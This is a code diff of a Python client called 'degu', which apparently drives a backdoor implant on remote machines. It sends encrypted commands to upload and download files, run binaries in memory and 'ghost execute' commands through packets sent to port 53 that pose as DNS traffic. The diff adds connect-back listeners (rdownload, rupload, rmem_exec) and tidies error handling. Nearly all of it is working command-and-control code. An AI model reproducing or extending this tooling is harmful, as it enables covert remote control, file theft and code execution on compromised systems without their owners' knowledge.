@@ -35,10 +35,10 @@ def mock_dns():
 class LogFmt(logging.Formatter):
     """ class for log formating """
 
-    def __init__(self): 
+    def __init__(self):
         logging.Formatter.__init__(self)
 
-    def format_time(self): 
+    def format_time(self):
         """ format time """
         return time.strftime("%H:%M.%S")
 
@@ -54,7 +54,7 @@ class LogFmt(logging.Formatter):
     def format(self,record):
         header = self._l(record.levelname)[0] + "[" + self._l(record.levelname)[1] + "%8s"%record.levelname \
                + self._l(record.levelname)[1] + "  " + self.format_time() + "][%-5s]: " % record.name + "\033[0m"
-        return header + "\033[1;37m" + record.msg + "\033[0m"
+        return header + "\033[0m" + record.msg
 
 LEVEL = logging.DEBUG
 log = logging.getLogger('degu')
@@ -91,7 +91,13 @@ def create_dl_string(path):
 def create_up_string(path,file):
     """ create payload for file upload """
     lpath = struct.pack("I",len(path))
-    data = open(file,"rb").read()
+    data = None
+    try:
+        data = open(file,"rb").read()
+    except FileNotFoundError:
+        log.error(f"file {path} not found")
+        return None, None
+
     ldata = struct.pack("I",len(data))
     payload = DEGU_UP + ldata + lpath + path + data
     size = len(payload)
@@ -101,36 +107,8 @@ def create_up_string(path,file):
     data.value = payload + delta * b"\0"
     return data, total_size
 
-class degu_cb(object):
-    """ object that handle degu socket connback """
-    def __init__(self, degu, addr, bind = -1):
-        if bind > 0:
-            self.port = bind
-            self.addr = addr
-        else:
-            self.addr, self.port = addr.split(":")
-        self.degu = degu
-        self.thread = threading.Thread(target=self.run, args=())
-        self.thread.daemon = True
-        self.thread.start()
-        self.func = (None,None)
-
-    def run(self):
-        s = socket.socket()
-        s.bind((self.addr,self.port))
-        s.listen(5)
-        self.s, ip = s.accept()
-        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-        log.info(f"connect back from {repr(ip)}")
-        self.handle(self.s)
-        
-
-    def handle(self,s):
-        s.close()
-        
-
 class degu(object):
-    """ maion degu object to interact with"""
+    """ main degu object to interact with"""
     def __init__(self,host,priv):
         self.host = host
         try:
@@ -175,14 +153,14 @@ class degu(object):
 
     def mkbuf_upload(self, file , path, pub ):
         """ make upload buffer """
-        log.debug(f"mkbuf {file} {path}")
         self.bot_pubkey = self.xcrypt_knock(pub)
         cpub = ctypes.create_string_buffer(32)
         cpub.value = self.bot_pubkey
         key = ctypes.create_string_buffer(64)
         key.value = binascii.unhexlify(self.priv)
         data, total_size = create_up_string( path , file )
-        log.debug(repr(data.raw))
+        if not data :
+            return None
         self.lib.xbuf(cpub, key, data, total_size)
         return data.raw
 
@@ -196,7 +174,7 @@ class degu(object):
         data, total_size = create_bin_string(b,param)
         self.lib.xbuf(cpub,key,data, total_size )
         return data.raw
-    
+
     def mkbuf_ghost_exec(self,mycmd):
         """ make ghost exec buffer """
         rand = mock_dns()
@@ -216,18 +194,29 @@ class degu(object):
         self.lib.xsig(sig,data,len(data),key)
         return sig.raw
 
-    def download(self, path, cb = None ):
-        log.info(f"downloading {path}")
-        s = socket.socket()
-        s.connect((self.host,self.port))
-        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
-        self.bot_pubkey = self.xcrypt_knock(s.recv(32))
+    def mkbuf_download(self,path,pub):
+        self.bot_pubkey = self.xcrypt_knock(pub)
         cpub = ctypes.create_string_buffer(32)
         cpub.value = self.bot_pubkey
         key = ctypes.create_string_buffer(64)
         key.value = binascii.unhexlify(self.priv)
         data, total_size = create_dl_string( path )
         self.lib.xbuf(cpub, key, data, total_size)
+        return data,cpub
+
+    def rdownload(self,path,lport,timeout=5):
+        log.info(f"CB downloading {path.decode()}")
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind(('0.0.0.0', int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+
+        pub = s.recv(32)
+        data,cpub = self.mkbuf_download(path,pub)
+        key = ctypes.create_string_buffer(64)
+        key.value = binascii.unhexlify(self.priv)
 
         s.send(data.raw)
         recvdata = b""
@@ -245,22 +234,85 @@ class degu(object):
         else:
             log.error("no recv :(")
         s.close()
-    
+
+    def download(self, path, cb = None ):
+        log.info(f"Downloading {path.decode()}")
+        s = socket.socket()
+        s.connect((self.host,self.port))
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+
+        pub = s.recv(32)
+        data,cpub = self.mkbuf_download(path,pub)
+        key = ctypes.create_string_buffer(64)
+        key.value = binascii.unhexlify(self.priv)
+
+        s.send(data.raw)
+        recvdata = b""
+        while 1:
+            tmp = s.recv(10)
+            if tmp :
+                recvdata += tmp
+            else :
+                break
+        if len(recvdata) > 4:
+            self.lib.xbuf(cpub, key, recvdata, len(recvdata))
+            lmsg = struct.unpack(">I",recvdata[:4])[0]
+            s.close()
+            return recvdata[4:lmsg+4]
+        else:
+            log.error("no recv :(")
+        s.close()
+
     def upload(self, file , path ):
-        log.info(f"uploading {file} {path}")
+        log.info(f"Uploading {file.decode()} {path.decode()}")
         s = socket.socket()
         s.connect((self.host,self.port))
         s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
         pub = s.recv(32)
         data = self.mkbuf_upload(file, path, pub)
+        if not data :
+            return None
         s.send(data)
         s.close()
 
+    def rupload(self, file , path, lport, timeout=5 ):
+        log.info(f"cb Uploading {file.decode()} {path.decode()}")
+
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind(('0.0.0.0', int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_upload(file, path, pub)
+        if not data :
+            return None
+        s.send(data)
+        s.close()
+
+
     def mem_exec(self,b,param):
-        log.info("sending bin %s params %s "%(b,param))
+        log.info("Sending bin %s params '%s' "%(b,param.decode()))
         s = socket.socket()
         s.connect((self.host,self.port))
-        #s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
+        pub = s.recv(32)
+        data = self.mkbuf_mem_exec(b, param, pub)
+        s.send(data)
+        s.close()
+
+    def rmem_exec(self,b,param,lport,timeout=5):
+        log.info("Sending bin %s params '%s' "%(b,param.decode()))
+
+        serv = socket.socket()
+        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        serv.bind(('0.0.0.0', int(lport)))
+        serv.settimeout(timeout)
+        serv.listen(512)
+        s, _ = serv.accept()
+
         pub = s.recv(32)
         data = self.mkbuf_mem_exec(b, param, pub)
         s.send(data)
@@ -274,7 +326,6 @@ class degu(object):
         s.sendto(buf,0,(self.host,53))
         s.close()
 
-
     def ghost_exec(self,mycmd):
         log.info(f"ghost executing {mycmd}")
         buf = self.mkbuf_ghost_exec(mycmd)
@@ -283,7 +334,7 @@ class degu(object):
         log.debug("executing : %s"%mycmd)
         s.sendto(buf,0,(self.host,53))
         s.close()
-    
+
     def __str__(self):
         return f"<DEGU ({self.host})>"
 
